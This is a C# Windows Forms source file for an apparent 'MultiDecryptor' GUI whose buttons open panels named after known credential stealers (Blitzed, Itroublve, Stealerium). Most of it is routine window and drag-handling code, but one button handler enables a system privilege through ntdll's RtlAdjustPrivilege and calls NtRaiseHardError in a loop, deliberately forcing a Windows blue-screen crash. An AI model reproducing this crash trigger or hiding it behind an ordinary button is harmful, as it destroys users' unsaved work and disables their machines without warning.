using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MultiDecryptorGUI
{
    
    public partial class Form1 : Form
    {
        internal class Mouse
        {
            public static Point newpoint = default(Point);

            public static int x;

            public static int y;
        }

        public void loadform(object Form)
        {
			if(this.MainPanel.Controls.Count > 0)
				this.MainPanel.Controls.RemoveAt(0);
			Form f = Form as Form;
			f.TopLevel = false;
			f.Dock = DockStyle.Fill;
			this.MainPanel.Controls.Add(f);
			this.MainPanel.Tag = f;
			f.Show();
        }
		public Form1()
        {
            InitializeComponent();
		}

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }
		private void pictureBox1_Click(object sender, EventArgs e)
		{

		}

		private void guna2Button1_Click(object sender, EventArgs e)
        {
			loadform(new BlitzedForm());
        }

        private void btn_ItroublveOptions_Click(object sender, EventArgs e)
        {
			loadform(new ItroublveForm());
        }

        private void btn_StealeriumOptions_Click(object sender, EventArgs e)
        {
			loadform(new StealeriumForm());
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
			Environment.Exit(0);
        }

        private void PanelHeader_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void PanelHeader_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
            int Privilege,
            bool bEnablePrivilege,
            bool IsThreadPrivilege,
            out bool PreviousValue
        );
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );
        public const uint ASSERT_FAILURE = 0xc0000420;

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            while (true)
            {
                //https://github.com/AestheticalZ/BSODMachine/blob/master/Program.cs
                RtlAdjustPrivilege(19, true, false, out bool idk);
                NtRaiseHardError(ASSERT_FAILURE, 0, 0, IntPtr.Zero, 6, out uint output);
            }
        }

        private void guna2HtmlLabel1_Click(object sender, EventArgs e)
        {

        }
    }
}
